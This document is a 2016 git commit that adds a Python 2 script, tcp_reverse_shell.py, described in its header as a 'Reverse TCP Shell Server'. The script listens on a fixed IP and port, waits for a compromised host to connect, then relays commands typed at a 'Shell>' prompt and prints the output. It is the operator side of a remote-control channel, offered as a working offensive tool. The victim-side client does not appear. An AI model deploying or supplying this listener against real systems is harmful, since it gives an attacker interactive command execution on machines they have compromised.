245160de8515402ad28ec47c45bd114abf9c47b3
root <root@localhost.localdomain>
2016-01-20 00:57:43 +0200

    ilk

---
+++ tcp_reverse_shell.py
@@ -0,0 +1,29 @@
+#################################
+# Furkan Çalışkan, 2016
+# Reverse TCP Shell Server v 0.1
+#################################
+
+import socket
+
+def connect():
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.bind(("192.168.35.134", 8080))
+	s.listen(1)
+	conn, addr = s.accept()
+	print '[+] We got a connection from: ', addr
+	
+	while True:
+		command = raw_input("Shell> ")	
+		
+		if 'terminate' in command:
+			conn.send('terminate')
+			conn.close()
+			break
+		
+		else:
+			conn.send(command)
+			print conn.recv(1024)
+
+def main():
+	connect()
+main()
